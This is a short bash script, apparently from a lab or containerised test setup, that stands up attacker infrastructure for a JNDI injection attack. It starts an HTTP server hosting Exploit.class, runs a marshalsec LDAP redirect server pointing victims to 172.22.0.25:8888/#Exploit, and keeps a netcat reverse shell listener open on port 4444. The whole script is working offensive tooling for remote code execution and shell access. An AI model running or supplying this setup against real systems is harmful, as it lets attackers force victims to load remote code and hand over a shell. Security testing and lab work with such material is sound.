#!/bin/bash
# Attacker infrastructure: LDAP redirect + HTTP class server + reverse shell listener

cd /exploit

# Start HTTP server to serve Exploit.class
python3 -m http.server 8888 &
HTTP_PID=$!

# Start marshalsec LDAP redirect server
MARSHALSEC_JAR=$(find /exploit/marshalsec -name "marshalsec-*-all.jar" 2>/dev/null | head -1)
if [ -n "$MARSHALSEC_JAR" ]; then
    java -cp "$MARSHALSEC_JAR" marshalsec.jndi.LDAPRefServer \
        "http://172.22.0.25:8888/#Exploit" &
    LDAP_PID=$!
    echo "[attacker] LDAP server started on port 1389"
else
    echo "[attacker] marshalsec not built — running LDAP stub"
    while true; do nc -l -p 1389 -q 1 < /dev/null; done &
    LDAP_PID=$!
fi

# Start reverse shell listener
echo "[attacker] Listening for reverse shell on port 4444"
while true; do
    nc -lvnp 4444 2>/dev/null || sleep 1
done
